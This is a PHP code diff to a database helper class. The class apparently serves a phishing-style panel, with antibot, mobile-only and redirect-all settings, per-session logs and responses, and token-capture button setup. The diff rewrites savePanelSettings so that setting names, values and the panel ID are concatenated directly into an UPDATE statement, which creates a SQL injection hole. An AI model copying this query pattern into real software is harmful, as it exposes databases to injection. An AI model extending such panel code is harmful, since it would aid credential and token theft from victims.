@@ -371,9 +371,9 @@ class DB
         return false;
     }
 
-    public static function getPanelSettings($conn, $nodeName, $panelId)
+    public static function getPanelSettings($conn, $panelId)
     {
-        $query = $conn->prepare("SELECT * FROM $nodeName.pages where panelID=?");
+        $query = $conn->prepare("SELECT Mobile_Only, Redirect_All, Enable_Captcha, Enable_Turnstile, CFSiteSecret, CFSiteKey FROM panels where panelID=?");
         $query->bind_param('s', $panelId);
         $query->execute();
         $queryresult = $query->get_result();
@@ -384,10 +384,16 @@ class DB
         return false;
     }
 
-    public static function savePanelSettings($conn, $nodeName, $panelId, $antibot_active, $mobile_only, $Redirect_all)
+    public static function savePanelSettings($conn, $panelId, $newSettings)
     {
-        $query = $conn->prepare("UPDATE $nodeName.pages SET antibot_active = ?, mobile_only=?, Redirect_all=? where panelID=?");
-        $query->bind_param("ssss", $antibot_active, $mobile_only, $Redirect_all, $panelId);
+        $sql = "UPDATE panels SET"; 
+        foreach(array_keys($newSettings) as $settingname){
+            $value = $newSettings[$settingname];
+            $sql .= " $settingname = '$value', ";
+        }
+        $sql = rtrim($sql,", ");
+        $sql .= " WHERE panelID = '$panelId';";
+        $query = $conn->prepare($sql);
         $query->execute();
         $status = $query->execute();
         return $status;
@@ -492,28 +498,15 @@ class DB
         return false;
     }
 
-    public static function getSession($conn, $nodeName, $sessionId, $getpages)
+    public static function getSession($conn, $sessionId)
     {
-        $sql = null;
-        if ($getpages) {
-            $sql = "select * from logs INNER JOIN `$nodeName`.pages ON pages.pageID = logs.pageID AND SessionID=?";
-        } else {
-            $sql = "select * from logs where SessionID=?";
-        }
+        $sql = "select * from logs where SessionID=?";
         $query = $conn->prepare($sql);
         $query->bind_param("s", $sessionId);
         $query->execute();
         $queryresult = $query->get_result();
         if ($queryresult) {
             $result = $queryresult->fetch_all(MYSQLI_ASSOC);
-            if (null !== $result && count($result) == 0) {
-                $query2 = $conn->prepare("select * from logs where SessionID=?");
-                $query2->bind_param("s", $sessionId);
-                $query2->execute();
-                $query2result = $query2->get_result();
-                $result2 = $query2result->fetch_all(MYSQLI_ASSOC);
-                return $result2;
-            }
             return $result;
         }
         return false;
@@ -521,7 +514,7 @@ class DB
 
     public static function getResponses($conn, $sessionId)
     {
-        $query = $conn->prepare("select * from respons where SessionID=?");
+        $query = $conn->prepare("select * from respons where SessionID=? ORDER BY timestamp;");
         $query->bind_param("s", $sessionId);
         $query->execute();
         $queryresult = $query->get_result();
@@ -532,10 +525,14 @@ class DB
         return false;
     }
 
-    public static function getOptions($conn, $nodeName, $pageId)
+    public static function getOptions($conn, $blueprintName)
     {
-        $query = $conn->prepare("select tokenButtonName,tokenButtonType,tokenName,isMainRow,SendTokenWithError FROM `$nodeName`.tokensetup where pageID=? AND tokenButtonName IS NOT NULL");
-        $query->bind_param("s", $pageId);
+        $query = $conn->prepare(
+            "select tokenButtonName,tokenButtonType,tokenName,pagefile,isMainRow,SendTokenWithError ".
+            "FROM blueprints_tokens ".
+            "where blueprint=? AND tokenButtonName IS NOT NULL");
+            
+        $query->bind_param("s", $blueprintName);
         $query->execute();
         $queryresult = $query->get_result();
         if ($queryresult) {
@@ -962,9 +959,10 @@ class DB
         return false;
     }
 
-    public static function getBlueprints($conn)
+    public static function getBlueprints($conn,$userId)
     {
-        $query = $conn->prepare("SELECT * from blueprints");
+        $query = $conn->prepare("select blueprints.*, username as creator from blueprints join users on creatorUserId = userId where userId = ?");
+        $query->bind_param("s",$userId);
         $query->execute();
         $queryresult = $query->get_result();
         if ($queryresult) {
